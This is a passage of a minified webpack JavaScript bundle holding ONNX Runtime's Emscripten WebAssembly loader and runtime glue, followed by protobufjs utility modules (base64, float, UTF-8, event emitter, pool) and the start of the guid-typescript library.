R,S,O=0,P=null,Q=null;function G(a){throw e.onAbort&&e.onAbort(a),E(a="Aborted("+a+")"),J=!0,a=new WebAssembly.RuntimeError(a+". Build with -sASSERTIONS for more info."),h(a),a}function ka(a){return a.startsWith("data:application/octet-stream;base64,")}if(!ka(R="ort-wasm.wasm")){var la=R;R=e.locateFile?e.locateFile(la,y):y+la}function ma(a){if(a==R&&F)return new Uint8Array(F);if(C)return C(a);throw"both async and sync fetching of the wasm failed"}function oa(a,b,c){return function na(a){if(!F&&(ca||v)){if("function"==typeof fetch&&!a.startsWith("file://"))return fetch(a,{credentials:"same-origin"}).then((b=>{if(!b.ok)throw"failed to load wasm binary file at '"+a+"'";return b.arrayBuffer()})).catch((()=>ma(a)));if(B)return new Promise(((b,c)=>{B(a,(f=>b(new Uint8Array(f))),c)}))}return Promise.resolve().then((()=>ma(a)))}(a).then((f=>WebAssembly.instantiate(f,b))).then((f=>f)).then(c,(f=>{E("failed to asynchronously prepare wasm: "+f),G(f)}))}function qa(a){this.name="ExitStatus",this.message=`Program terminated with exit(${a})`,this.status=a}var T=a=>{for(;0<a.length;)a.shift()(e)};function ra(a){this.qa=a-24,this.va=function(b){N[this.qa+4>>2>>>0]=b},this.ua=function(b){N[this.qa+8>>2>>>0]=b},this.sa=function(b,c){this.ta(),this.va(b),this.ua(c)},this.ta=function(){N[this.qa+16>>2>>>0]=0}}var Da,ua="undefined"!=typeof TextDecoder?new TextDecoder("utf8"):void 0,va=(a,b,c)=>{var f=(b>>>=0)+c;for(c=b;a[c]&&!(c>=f);)++c;if(16<c-b&&a.buffer&&ua)return ua.decode(a.subarray(b,c));for(f="";b<c;){var g=a[b++];if(128&g){var k=63&a[b++];if(192==(224&g))f+=String.fromCharCode((31&g)<<6|k);else{var l=63&a[b++];65536>(g=224==(240&g)?(15&g)<<12|k<<6|l:(7&g)<<18|k<<12|l<<6|63&a[b++])?f+=String.fromCharCode(g):(g-=65536,f+=String.fromCharCode(55296|g>>10,56320|1023&g))}}else f+=String.fromCharCode(g)}return f},U=(a,b)=>(a>>>=0)?va(L,a,b):"",V=a=>{for(var b=0,c=0;c<a.length;++c){var f=a.charCodeAt(c);127>=f?b++:2047>=f?b+=2:55296<=f&&57343>=f?(b+=4,++c):b+=3}return b},W=(a,b,c,f)=>{if(!(0<f))return 0;var g=c>>>=0;f=c+f-1;for(var k=0;k<a.length;++k){var l=a.charCodeAt(k);if(55296<=l&&57343>=l&&(l=65536+((1023&l)<<10)|1023&a.charCodeAt(++k)),127>=l){if(c>=f)break;b[c++>>>0]=l}else{if(2047>=l){if(c+1>=f)break;b[c++>>>0]=192|l>>6}else{if(65535>=l){if(c+2>=f)break;b[c++>>>0]=224|l>>12}else{if(c+3>=f)break;b[c++>>>0]=240|l>>18,b[c++>>>0]=128|l>>12&63}b[c++>>>0]=128|l>>6&63}b[c++>>>0]=128|63&l}}return b[c>>>0]=0,c-g},X=a=>0==a%4&&(0!=a%100||0==a%400),wa=[0,31,60,91,121,152,182,213,244,274,305,335],xa=[0,31,59,90,120,151,181,212,243,273,304,334],Ca=a=>{var b=V(a)+1,c=ya(b);return c&&W(a,L,c,b),c},Y={},Ea=()=>{if(!Da){var b,a={USER:"web_user",LOGNAME:"web_user",PATH:"/",PWD:"/",HOME:"/home/web_user",LANG:("object"==typeof navigator&&navigator.languages&&navigator.languages[0]||"C").replace("-","_")+".UTF-8",_:m||"./this.program"};for(b in Y)void 0===Y[b]?delete a[b]:a[b]=Y[b];var c=[];for(b in a)c.push(`${b}=${a[b]}`);Da=c}return Da},Fa=[null,[],[]],Ha=a=>(Ha=(()=>{if("object"==typeof crypto&&"function"==typeof crypto.getRandomValues)return c=>crypto.getRandomValues(c);if(x)try{var a=__webpack_require__("?892d");if(a.randomFillSync)return c=>a.randomFillSync(c);var b=a.randomBytes;return c=>(c.set(b(c.byteLength)),c)}catch(c){}G("initRandomDevice")})())(a),Ia=[31,29,31,30,31,30,31,31,30,31,30,31],Ja=[31,28,31,30,31,30,31,31,30,31,30,31];function La(a,b,c,f){function g(d,n,p){for(d="number"==typeof d?d.toString():d||"";d.length<n;)d=p[0]+d;return d}function k(d,n){return g(d,n,"0")}function l(d,n){function p(za){return 0>za?-1:0<za?1:0}var z;return 0===(z=p(d.getFullYear()-n.getFullYear()))&&0===(z=p(d.getMonth()-n.getMonth()))&&(z=p(d.getDate()-n.getDate())),z}function r(d){switch(d.getDay()){case 0:return new Date(d.getFullYear()-1,11,29);case 1:return d;case 2:return new Date(d.getFullYear(),0,3);case 3:return new Date(d.getFullYear(),0,2);case 4:return new Date(d.getFullYear(),0,1);case 5:return new Date(d.getFullYear()-1,11,31);case 6:return new Date(d.getFullYear()-1,11,30)}}function w(d){var n=d.ma;for(d=new Date(new Date(d.na+1900,0,1).getTime());0<n;){var p=d.getMonth(),z=(X(d.getFullYear())?Ia:Ja)[p];if(!(n>z-d.getDate())){d.setDate(d.getDate()+n);break}n-=z-d.getDate()+1,d.setDate(1),11>p?d.setMonth(p+1):(d.setMonth(0),d.setFullYear(d.getFullYear()+1))}return p=new Date(d.getFullYear()+1,0,4),n=r(new Date(d.getFullYear(),0,4)),p=r(p),0>=l(n,d)?0>=l(p,d)?d.getFullYear()+1:d.getFullYear():d.getFullYear()-1}a>>>=0,b>>>=0,c>>>=0;var t=M[40+(f>>>=0)>>2>>>0];for(var u in f={ya:M[f>>2>>>0],xa:M[f+4>>2>>>0],oa:M[f+8>>2>>>0],ra:M[f+12>>2>>>0],pa:M[f+16>>2>>>0],na:M[f+20>>2>>>0],ha:M[f+24>>2>>>0],ma:M[f+28>>2>>>0],Aa:M[f+32>>2>>>0],wa:M[f+36>>2>>>0],za:t?U(t):""},c=U(c),t={"%c":"%a %b %d %H:%M:%S %Y","%D":"%m/%d/%y","%F":"%Y-%m-%d","%h":"%b","%r":"%I:%M:%S %p","%R":"%H:%M","%T":"%H:%M:%S","%x":"%m/%d/%y","%X":"%H:%M:%S","%Ec":"%c","%EC":"%C","%Ex":"%m/%d/%y","%EX":"%H:%M:%S","%Ey":"%y","%EY":"%Y","%Od":"%d","%Oe":"%e","%OH":"%H","%OI":"%I","%Om":"%m","%OM":"%M","%OS":"%S","%Ou":"%u","%OU":"%U","%OV":"%V","%Ow":"%w","%OW":"%W","%Oy":"%y"})c=c.replace(new RegExp(u,"g"),t[u]);var Aa="Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),Ba="January February March April May June July August September October November December".split(" ");for(u in t={"%a":d=>Aa[d.ha].substring(0,3),"%A":d=>Aa[d.ha],"%b":d=>Ba[d.pa].substring(0,3),"%B":d=>Ba[d.pa],"%C":d=>k((d.na+1900)/100|0,2),"%d":d=>k(d.ra,2),"%e":d=>g(d.ra,2," "),"%g":d=>w(d).toString().substring(2),"%G":d=>w(d),"%H":d=>k(d.oa,2),"%I":d=>(0==(d=d.oa)?d=12:12<d&&(d-=12),k(d,2)),"%j":d=>{for(var n=0,p=0;p<=d.pa-1;n+=(X(d.na+1900)?Ia:Ja)[p++]);return k(d.ra+n,3)},"%m":d=>k(d.pa+1,2),"%M":d=>k(d.xa,2),"%n":()=>"\n","%p":d=>0<=d.oa&&12>d.oa?"AM":"PM","%S":d=>k(d.ya,2),"%t":()=>"\t","%u":d=>d.ha||7,"%U":d=>k(Math.floor((d.ma+7-d.ha)/7),2),"%V":d=>{var n=Math.floor((d.ma+7-(d.ha+6)%7)/7);if(2>=(d.ha+371-d.ma-2)%7&&n++,n)53==n&&(4==(p=(d.ha+371-d.ma)%7)||3==p&&X(d.na)||(n=1));else{n=52;var p=(d.ha+7-d.ma-1)%7;(4==p||5==p&&X(d.na%400-1))&&n++}return k(n,2)},"%w":d=>d.ha,"%W":d=>k(Math.floor((d.ma+7-(d.ha+6)%7)/7),2),"%y":d=>(d.na+1900).toString().substring(2),"%Y":d=>d.na+1900,"%z":d=>{var n=0<=(d=d.wa);return d=Math.abs(d)/60,(n?"+":"-")+String("0000"+(d/60*100+d%60)).slice(-4)},"%Z":d=>d.za,"%%":()=>"%"},c=c.replace(/%%/g,"\0\0"),t)c.includes(u)&&(c=c.replace(new RegExp(u,"g"),t[u](f)));return u=function Ka(a){var b=Array(V(a)+1);return W(a,b,0,b.length),b}(c=c.replace(/\0\0/g,"%")),u.length>b?0:(K.set(u,a>>>0),u.length-1)}var Na={a:function(a,b,c){throw new ra(a>>>=0).sa(b>>>0,c>>>0),a},e:function(){return 0},I:function(){},y:function(){},A:function(){},K:function(){return 0},G:function(){},B:function(){},F:function(){},g:function(){},z:function(){},w:function(){},H:function(){},x:function(){},k:()=>!0,n:function(a,b,c){a=b+2097152>>>0<4194305-!!a?(a>>>0)+4294967296*b:NaN,c>>>=0,a=new Date(1e3*a),M[c>>2>>>0]=a.getUTCSeconds(),M[c+4>>2>>>0]=a.getUTCMinutes(),M[c+8>>2>>>0]=a.getUTCHours(),M[c+12>>2>>>0]=a.getUTCDate(),M[c+16>>2>>>0]=a.getUTCMonth(),M[c+20>>2>>>0]=a.getUTCFullYear()-1900,M[c+24>>2>>>0]=a.getUTCDay(),M[c+28>>2>>>0]=(a.getTime()-Date.UTC(a.getUTCFullYear(),0,1,0,0,0,0))/864e5|0},o:function(a,b,c){a=b+2097152>>>0<4194305-!!a?(a>>>0)+4294967296*b:NaN,c>>>=0,a=new Date(1e3*a),M[c>>2>>>0]=a.getSeconds(),M[c+4>>2>>>0]=a.getMinutes(),M[c+8>>2>>>0]=a.getHours(),M[c+12>>2>>>0]=a.getDate(),M[c+16>>2>>>0]=a.getMonth(),M[c+20>>2>>>0]=a.getFullYear()-1900,M[c+24>>2>>>0]=a.getDay(),M[c+28>>2>>>0]=(X(a.getFullYear())?wa:xa)[a.getMonth()]+a.getDate()-1|0,M[c+36>>2>>>0]=-60*a.getTimezoneOffset(),b=new Date(a.getFullYear(),6,1).getTimezoneOffset();var f=new Date(a.getFullYear(),0,1).getTimezoneOffset();M[c+32>>2>>>0]=0|(b!=f&&a.getTimezoneOffset()==Math.min(f,b))},p:function(a){a>>>=0;var b=new Date(M[a+20>>2>>>0]+1900,M[a+16>>2>>>0],M[a+12>>2>>>0],M[a+8>>2>>>0],M[a+4>>2>>>0],M[a>>2>>>0],0),c=M[a+32>>2>>>0],f=b.getTimezoneOffset(),g=new Date(b.getFullYear(),6,1).getTimezoneOffset(),k=new Date(b.getFullYear(),0,1).getTimezoneOffset(),l=Math.min(k,g);return 0>c?M[a+32>>2>>>0]=Number(g!=k&&l==f):0<c!=(l==f)&&(g=Math.max(k,g),b.setTime(b.getTime()+6e4*((0<c?l:g)-f))),M[a+24>>2>>>0]=b.getDay(),M[a+28>>2>>>0]=(X(b.getFullYear())?wa:xa)[b.getMonth()]+b.getDate()-1|0,M[a>>2>>>0]=b.getSeconds(),M[a+4>>2>>>0]=b.getMinutes(),M[a+8>>2>>>0]=b.getHours(),M[a+12>>2>>>0]=b.getDate(),M[a+16>>2>>>0]=b.getMonth(),M[a+20>>2>>>0]=b.getYear(),a=b.getTime()/1e3,Ma((S=a,1<=+Math.abs(S)?0<S?+Math.floor(S/4294967296)>>>0:~~+Math.ceil((S-+(~~S>>>0))/4294967296)>>>0:0)),a>>>0},l:function(){return-52},m:function(){},u:function(a,b,c){function f(w){return(w=w.toTimeString().match(/\(([A-Za-z ]+)\)$/))?w[1]:"GMT"}c>>>=0;var g=(new Date).getFullYear(),k=new Date(g,0,1),l=new Date(g,6,1);g=k.getTimezoneOffset();var r=l.getTimezoneOffset();N[a>>>0>>2>>>0]=60*Math.max(g,r),M[b>>>0>>2>>>0]=Number(g!=r),a=f(k),b=f(l),a=Ca(a),b=Ca(b),r<g?(N[c>>2>>>0]=a,N[c+4>>2>>>0]=b):(N[c>>2>>>0]=b,N[c+4>>2>>>0]=a)},d:()=>{G("")},h:function(){return Date.now()},v:function(){return 4294901760},b:()=>performance.now(),J:function(a,b,c){return b>>>=0,L.copyWithin(a>>>0>>>0,b>>>0,b+(c>>>0)>>>0)},t:function(a){a>>>=0;var b=L.length;if(4294901760<a)return!1;for(var c=1;4>=c;c*=2){var f=b*(1+.2/c);f=Math.min(f,a+100663296);var g=Math;f=Math.max(a,f);a:{g=g.min.call(g,4294901760,f+(65536-f%65536)%65536)-H.buffer.byteLength+65535>>>16;try{H.grow(g),ea();var k=1;break a}catch(l){}k=void 0}if(k)return!0}return!1},D:function(a,b){a>>>=0,b>>>=0;var c=0;return Ea().forEach((function(f,g){var k=b+c;for(g=N[a+4*g>>2>>>0]=k,k=0;k<f.length;++k)K[g++>>0>>>0]=f.charCodeAt(k);K[g>>0>>>0]=0,c+=f.length+1})),0},E:function(a,b){a>>>=0,b>>>=0;var c=Ea();N[a>>2>>>0]=c.length;var f=0;return c.forEach((function(g){f+=g.length+1})),N[b>>2>>>0]=f,0},s:a=>{noExitRuntime||(e.onExit&&e.onExit(a),J=!0),q(a,new qa(a))},f:()=>52,j:function(){return 52},q:function(){return 70},i:function(a,b,c,f){b>>>=0,c>>>=0,f>>>=0;for(var g=0,k=0;k<c;k++){var l=N[b>>2>>>0],r=N[b+4>>2>>>0];b+=8;for(var w=0;w<r;w++){var t=L[l+w>>>0],u=Fa[a];0===t||10===t?((1===a?da:E)(va(u,0)),u.length=0):u.push(t)}g+=r}return N[f>>2>>>0]=g,0},r:function(a,b){return a>>>=0,Ha(L.subarray(a>>>0,a+(b>>>0)>>>0)),0},C:La,c:function(a,b,c,f){return La(a>>>0,b>>>0,c>>>0,f>>>0)}};!function(){function a(c){if(c=c.exports,I=c=function Oa(a){a=Object.assign({},a);var b=f=>()=>f()>>>0,c=f=>g=>f(g)>>>0;return a.__errno_location=b(a.__errno_location),a.malloc=c(a.malloc),a.stackSave=b(a.stackSave),a.stackAlloc=c(a.stackAlloc),a}(c),H=I.L,ea(),ha.unshift(I.M),O--,e.monitorRunDependencies&&e.monitorRunDependencies(O),0==O&&(null!==P&&(clearInterval(P),P=null),Q)){var f=Q;Q=null,f()}return c}var b={a:Na};if(O++,e.monitorRunDependencies&&e.monitorRunDependencies(O),e.instantiateWasm)try{return e.instantiateWasm(b,a)}catch(c){E("Module.instantiateWasm callback failed with error: "+c),h(c)}(function pa(a,b){var c=R;return F||"function"!=typeof WebAssembly.instantiateStreaming||ka(c)||c.startsWith("file://")||x||"function"!=typeof fetch?oa(c,a,b):fetch(c,{credentials:"same-origin"}).then((f=>WebAssembly.instantiateStreaming(f,a).then(b,(function(g){return E("wasm streaming compile failed: "+g),E("falling back to ArrayBuffer instantiation"),oa(c,a,b)}))))})(b,(function(c){a(c.instance)})).catch(h)}(),e._OrtInit=(a,b)=>(e._OrtInit=I.N)(a,b),e._OrtGetLastError=(a,b)=>(e._OrtGetLastError=I.O)(a,b),e._OrtCreateSessionOptions=(a,b,c,f,g,k,l,r,w,t)=>(e._OrtCreateSessionOptions=I.P)(a,b,c,f,g,k,l,r,w,t),e._OrtAppendExecutionProvider=(a,b)=>(e._OrtAppendExecutionProvider=I.Q)(a,b),e._OrtAddSessionConfigEntry=(a,b,c)=>(e._OrtAddSessionConfigEntry=I.R)(a,b,c),e._OrtReleaseSessionOptions=a=>(e._OrtReleaseSessionOptions=I.S)(a),e._OrtCreateSession=(a,b,c)=>(e._OrtCreateSession=I.T)(a,b,c),e._OrtReleaseSession=a=>(e._OrtReleaseSession=I.U)(a),e._OrtGetInputOutputCount=(a,b,c)=>(e._OrtGetInputOutputCount=I.V)(a,b,c),e._OrtGetInputName=(a,b)=>(e._OrtGetInputName=I.W)(a,b),e._OrtGetOutputName=(a,b)=>(e._OrtGetOutputName=I.X)(a,b),e._OrtFree=a=>(e._OrtFree=I.Y)(a),e._OrtCreateTensor=(a,b,c,f,g)=>(e._OrtCreateTensor=I.Z)(a,b,c,f,g),e._OrtGetTensorData=(a,b,c,f,g)=>(e._OrtGetTensorData=I._)(a,b,c,f,g),e._OrtReleaseTensor=a=>(e._OrtReleaseTensor=I.$)(a),e._OrtCreateRunOptions=(a,b,c,f)=>(e._OrtCreateRunOptions=I.aa)(a,b,c,f),e._OrtAddRunConfigEntry=(a,b,c)=>(e._OrtAddRunConfigEntry=I.ba)(a,b,c),e._OrtReleaseRunOptions=a=>(e._OrtReleaseRunOptions=I.ca)(a),e._OrtRun=(a,b,c,f,g,k,l,r)=>(e._OrtRun=I.da)(a,b,c,f,g,k,l,r),e._OrtEndProfiling=a=>(e._OrtEndProfiling=I.ea)(a);var ya=e._malloc=a=>(ya=e._malloc=I.fa)(a);e._free=a=>(e._free=I.ga)(a);var Z,Ma=a=>(Ma=I.ia)(a),Pa=()=>(Pa=I.ja)(),Qa=a=>(Qa=I.ka)(a),Ra=a=>(Ra=I.la)(a);function Ta(){function a(){if(!Z&&(Z=!0,e.calledRun=!0,!J)){if(T(ha),aa(e),e.onRuntimeInitialized&&e.onRuntimeInitialized(),e.postRun)for("function"==typeof e.postRun&&(e.postRun=[e.postRun]);e.postRun.length;){var b=e.postRun.shift();ia.unshift(b)}T(ia)}}if(!(0<O)){if(e.preRun)for("function"==typeof e.preRun&&(e.preRun=[e.preRun]);e.preRun.length;)ja();T(fa),0<O||(e.setStatus?(e.setStatus("Running..."),setTimeout((function(){setTimeout((function(){e.setStatus("")}),1),a()}),1)):a())}}if(e.stackAlloc=Ra,e.stackSave=Pa,e.stackRestore=Qa,e.UTF8ToString=U,e.stringToUTF8=(a,b,c)=>W(a,L,b,c),e.lengthBytesUTF8=V,Q=function Sa(){Z||Ta(),Z||(Q=Sa)},e.preInit)for("function"==typeof e.preInit&&(e.preInit=[e.preInit]);0<e.preInit.length;)e.preInit.pop()();return Ta(),moduleArg.ready});module.exports=ortWasm},"./node_modules/@protobufjs/aspromise/index.js":module=>{"use strict";module.exports=function asPromise(fn,ctx){var params=new Array(arguments.length-1),offset=0,index=2,pending=!0;for(;index<arguments.length;)params[offset++]=arguments[index++];return new Promise((function executor(resolve,reject){params[offset]=function callback(err){if(pending)if(pending=!1,err)reject(err);else{for(var params=new Array(arguments.length-1),offset=0;offset<params.length;)params[offset++]=arguments[offset];resolve.apply(null,params)}};try{fn.apply(ctx||null,params)}catch(err){pending&&(pending=!1,reject(err))}}))}},"./node_modules/@protobufjs/base64/index.js":(__unused_webpack_module,exports)=>{"use strict";var base64=exports;base64.length=function length(string){var p=string.length;if(!p)return 0;for(var n=0;--p%4>1&&"="===string.charAt(p);)++n;return Math.ceil(3*string.length)/4-n};for(var b64=new Array(64),s64=new Array(123),i=0;i<64;)s64[b64[i]=i<26?i+65:i<52?i+71:i<62?i-4:i-59|43]=i++;base64.encode=function encode(buffer,start,end){for(var t,parts=null,chunk=[],i=0,j=0;start<end;){var b=buffer[start++];switch(j){case 0:chunk[i++]=b64[b>>2],t=(3&b)<<4,j=1;break;case 1:chunk[i++]=b64[t|b>>4],t=(15&b)<<2,j=2;break;case 2:chunk[i++]=b64[t|b>>6],chunk[i++]=b64[63&b],j=0}i>8191&&((parts||(parts=[])).push(String.fromCharCode.apply(String,chunk)),i=0)}return j&&(chunk[i++]=b64[t],chunk[i++]=61,1===j&&(chunk[i++]=61)),parts?(i&&parts.push(String.fromCharCode.apply(String,chunk.slice(0,i))),parts.join("")):String.fromCharCode.apply(String,chunk.slice(0,i))};base64.decode=function decode(string,buffer,offset){for(var t,start=offset,j=0,i=0;i<string.length;){var c=string.charCodeAt(i++);if(61===c&&j>1)break;if(void 0===(c=s64[c]))throw Error("invalid encoding");switch(j){case 0:t=c,j=1;break;case 1:buffer[offset++]=t<<2|(48&c)>>4,t=c,j=2;break;case 2:buffer[offset++]=(15&t)<<4|(60&c)>>2,t=c,j=3;break;case 3:buffer[offset++]=(3&t)<<6|c,j=0}}if(1===j)throw Error("invalid encoding");return offset-start},base64.test=function test(string){return/^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/.test(string)}},"./node_modules/@protobufjs/eventemitter/index.js":module=>{"use strict";function EventEmitter(){this._listeners={}}module.exports=EventEmitter,EventEmitter.prototype.on=function on(evt,fn,ctx){return(this._listeners[evt]||(this._listeners[evt]=[])).push({fn:fn,ctx:ctx||this}),this},EventEmitter.prototype.off=function off(evt,fn){if(void 0===evt)this._listeners={};else if(void 0===fn)this._listeners[evt]=[];else for(var listeners=this._listeners[evt],i=0;i<listeners.length;)listeners[i].fn===fn?listeners.splice(i,1):++i;return this},EventEmitter.prototype.emit=function emit(evt){var listeners=this._listeners[evt];if(listeners){for(var args=[],i=1;i<arguments.length;)args.push(arguments[i++]);for(i=0;i<listeners.length;)listeners[i].fn.apply(listeners[i++].ctx,args)}return this}},"./node_modules/@protobufjs/float/index.js":module=>{"use strict";function factory(exports){return"undefined"!=typeof Float32Array?function(){var f32=new Float32Array([-0]),f8b=new Uint8Array(f32.buffer),le=128===f8b[3];function writeFloat_f32_cpy(val,buf,pos){f32[0]=val,buf[pos]=f8b[0],buf[pos+1]=f8b[1],buf[pos+2]=f8b[2],buf[pos+3]=f8b[3]}function writeFloat_f32_rev(val,buf,pos){f32[0]=val,buf[pos]=f8b[3],buf[pos+1]=f8b[2],buf[pos+2]=f8b[1],buf[pos+3]=f8b[0]}function readFloat_f32_cpy(buf,pos){return f8b[0]=buf[pos],f8b[1]=buf[pos+1],f8b[2]=buf[pos+2],f8b[3]=buf[pos+3],f32[0]}function readFloat_f32_rev(buf,pos){return f8b[3]=buf[pos],f8b[2]=buf[pos+1],f8b[1]=buf[pos+2],f8b[0]=buf[pos+3],f32[0]}exports.writeFloatLE=le?writeFloat_f32_cpy:writeFloat_f32_rev,exports.writeFloatBE=le?writeFloat_f32_rev:writeFloat_f32_cpy,exports.readFloatLE=le?readFloat_f32_cpy:readFloat_f32_rev,exports.readFloatBE=le?readFloat_f32_rev:readFloat_f32_cpy}():function(){function writeFloat_ieee754(writeUint,val,buf,pos){var sign=val<0?1:0;if(sign&&(val=-val),0===val)writeUint(1/val>0?0:2147483648,buf,pos);else if(isNaN(val))writeUint(2143289344,buf,pos);else if(val>34028234663852886e22)writeUint((sign<<31|2139095040)>>>0,buf,pos);else if(val<11754943508222875e-54)writeUint((sign<<31|Math.round(val/1401298464324817e-60))>>>0,buf,pos);else{var exponent=Math.floor(Math.log(val)/Math.LN2);writeUint((sign<<31|exponent+127<<23|8388607&Math.round(val*Math.pow(2,-exponent)*8388608))>>>0,buf,pos)}}function readFloat_ieee754(readUint,buf,pos){var uint=readUint(buf,pos),sign=2*(uint>>31)+1,exponent=uint>>>23&255,mantissa=8388607&uint;return 255===exponent?mantissa?NaN:sign*(1/0):0===exponent?1401298464324817e-60*sign*mantissa:sign*Math.pow(2,exponent-150)*(mantissa+8388608)}exports.writeFloatLE=writeFloat_ieee754.bind(null,writeUintLE),exports.writeFloatBE=writeFloat_ieee754.bind(null,writeUintBE),exports.readFloatLE=readFloat_ieee754.bind(null,readUintLE),exports.readFloatBE=readFloat_ieee754.bind(null,readUintBE)}(),"undefined"!=typeof Float64Array?function(){var f64=new Float64Array([-0]),f8b=new Uint8Array(f64.buffer),le=128===f8b[7];function writeDouble_f64_cpy(val,buf,pos){f64[0]=val,buf[pos]=f8b[0],buf[pos+1]=f8b[1],buf[pos+2]=f8b[2],buf[pos+3]=f8b[3],buf[pos+4]=f8b[4],buf[pos+5]=f8b[5],buf[pos+6]=f8b[6],buf[pos+7]=f8b[7]}function writeDouble_f64_rev(val,buf,pos){f64[0]=val,buf[pos]=f8b[7],buf[pos+1]=f8b[6],buf[pos+2]=f8b[5],buf[pos+3]=f8b[4],buf[pos+4]=f8b[3],buf[pos+5]=f8b[2],buf[pos+6]=f8b[1],buf[pos+7]=f8b[0]}function readDouble_f64_cpy(buf,pos){return f8b[0]=buf[pos],f8b[1]=buf[pos+1],f8b[2]=buf[pos+2],f8b[3]=buf[pos+3],f8b[4]=buf[pos+4],f8b[5]=buf[pos+5],f8b[6]=buf[pos+6],f8b[7]=buf[pos+7],f64[0]}function readDouble_f64_rev(buf,pos){return f8b[7]=buf[pos],f8b[6]=buf[pos+1],f8b[5]=buf[pos+2],f8b[4]=buf[pos+3],f8b[3]=buf[pos+4],f8b[2]=buf[pos+5],f8b[1]=buf[pos+6],f8b[0]=buf[pos+7],f64[0]}exports.writeDoubleLE=le?writeDouble_f64_cpy:writeDouble_f64_rev,exports.writeDoubleBE=le?writeDouble_f64_rev:writeDouble_f64_cpy,exports.readDoubleLE=le?readDouble_f64_cpy:readDouble_f64_rev,exports.readDoubleBE=le?readDouble_f64_rev:readDouble_f64_cpy}():function(){function writeDouble_ieee754(writeUint,off0,off1,val,buf,pos){var sign=val<0?1:0;if(sign&&(val=-val),0===val)writeUint(0,buf,pos+off0),writeUint(1/val>0?0:2147483648,buf,pos+off1);else if(isNaN(val))writeUint(0,buf,pos+off0),writeUint(2146959360,buf,pos+off1);else if(val>17976931348623157e292)writeUint(0,buf,pos+off0),writeUint((sign<<31|2146435072)>>>0,buf,pos+off1);else{var mantissa;if(val<22250738585072014e-324)writeUint((mantissa=val/5e-324)>>>0,buf,pos+off0),writeUint((sign<<31|mantissa/4294967296)>>>0,buf,pos+off1);else{var exponent=Math.floor(Math.log(val)/Math.LN2);1024===exponent&&(exponent=1023),writeUint(4503599627370496*(mantissa=val*Math.pow(2,-exponent))>>>0,buf,pos+off0),writeUint((sign<<31|exponent+1023<<20|1048576*mantissa&1048575)>>>0,buf,pos+off1)}}}function readDouble_ieee754(readUint,off0,off1,buf,pos){var lo=readUint(buf,pos+off0),hi=readUint(buf,pos+off1),sign=2*(hi>>31)+1,exponent=hi>>>20&2047,mantissa=4294967296*(1048575&hi)+lo;return 2047===exponent?mantissa?NaN:sign*(1/0):0===exponent?5e-324*sign*mantissa:sign*Math.pow(2,exponent-1075)*(mantissa+4503599627370496)}exports.writeDoubleLE=writeDouble_ieee754.bind(null,writeUintLE,0,4),exports.writeDoubleBE=writeDouble_ieee754.bind(null,writeUintBE,4,0),exports.readDoubleLE=readDouble_ieee754.bind(null,readUintLE,0,4),exports.readDoubleBE=readDouble_ieee754.bind(null,readUintBE,4,0)}(),exports}function writeUintLE(val,buf,pos){buf[pos]=255&val,buf[pos+1]=val>>>8&255,buf[pos+2]=val>>>16&255,buf[pos+3]=val>>>24}function writeUintBE(val,buf,pos){buf[pos]=val>>>24,buf[pos+1]=val>>>16&255,buf[pos+2]=val>>>8&255,buf[pos+3]=255&val}function readUintLE(buf,pos){return(buf[pos]|buf[pos+1]<<8|buf[pos+2]<<16|buf[pos+3]<<24)>>>0}function readUintBE(buf,pos){return(buf[pos]<<24|buf[pos+1]<<16|buf[pos+2]<<8|buf[pos+3])>>>0}module.exports=factory(factory)},"./node_modules/@protobufjs/inquire/index.js":module=>{"use strict";function inquire(moduleName){try{var mod=eval("quire".replace(/^/,"re"))(moduleName);if(mod&&(mod.length||Object.keys(mod).length))return mod}catch(e){}return null}module.exports=inquire},"./node_modules/@protobufjs/pool/index.js":module=>{"use strict";module.exports=function pool(alloc,slice,size){var SIZE=size||8192,MAX=SIZE>>>1,slab=null,offset=SIZE;return function pool_alloc(size){if(size<1||size>MAX)return alloc(size);offset+size>SIZE&&(slab=alloc(SIZE),offset=0);var buf=slice.call(slab,offset,offset+=size);return 7&offset&&(offset=1+(7|offset)),buf}}},"./node_modules/@protobufjs/utf8/index.js":(__unused_webpack_module,exports)=>{"use strict";var utf8=exports;utf8.length=function utf8_length(string){for(var len=0,c=0,i=0;i<string.length;++i)(c=string.charCodeAt(i))<128?len+=1:c<2048?len+=2:55296==(64512&c)&&56320==(64512&string.charCodeAt(i+1))?(++i,len+=4):len+=3;return len},utf8.read=function utf8_read(buffer,start,end){if(end-start<1)return"";for(var t,parts=null,chunk=[],i=0;start<end;)(t=buffer[start++])<128?chunk[i++]=t:t>191&&t<224?chunk[i++]=(31&t)<<6|63&buffer[start++]:t>239&&t<365?(t=((7&t)<<18|(63&buffer[start++])<<12|(63&buffer[start++])<<6|63&buffer[start++])-65536,chunk[i++]=55296+(t>>10),chunk[i++]=56320+(1023&t)):chunk[i++]=(15&t)<<12|(63&buffer[start++])<<6|63&buffer[start++],i>8191&&((parts||(parts=[])).push(String.fromCharCode.apply(String,chunk)),i=0);return parts?(i&&parts.push(String.fromCharCode.apply(String,chunk.slice(0,i))),parts.join("")):String.fromCharCode.apply(String,chunk.slice(0,i))},utf8.write=function utf8_write(string,buffer,offset){for(var c1,c2,start=offset,i=0;i<string.length;++i)(c1=string.charCodeAt(i))<128?buffer[offset++]=c1:c1<2048?(buffer[offset++]=c1>>6|192,buffer[offset++]=63&c1|128):55296==(64512&c1)&&56320==(64512&(c2=string.charCodeAt(i+1)))?(c1=65536+((1023&c1)<<10)+(1023&c2),++i,buffer[offset++]=c1>>18|240,buffer[offset++]=c1>>12&63|128,buffer[offset++]=c1>>6&63|128,buffer[offset++]=63&c1|128):(buffer[offset++]=c1>>12|224,buffer[offset++]=c1>>6&63|128,buffer[offset++]=63&c1|128);return offset-start}},"./node_modules/guid-typescript/dist/guid.js":(__unused_webpack_module,exports)=>{"use strict";exports.__esModule=!0;var Guid=function(){function Guid(guid){if(!guid)throw new TypeError("Invalid argument; `value` has no value.");this.value=Guid.EMPTY,guid&&Guid.isGuid(guid)&&(this.value=guid)}return Guid.isGuid=function(guid){var value=guid.toString();return guid&&(guid instanceof Guid||Guid.validator.test(value))},Guid.create=function(){return new Guid([Guid.gen(2),Guid.gen(1),Guid.gen(1),Guid.gen(1),Guid.gen(3)].join("-"))},Guid.createEmpty=function(){return new Guid("emptyguid")},Guid.parse=function(guid){return new Guid(guid)},Guid.raw=function(){return[Guid.gen(2),Guid.gen(1),Guid.gen(1),Guid.gen(1),Guid.gen(3)].join("-")},Guid.gen=function(count){for(var 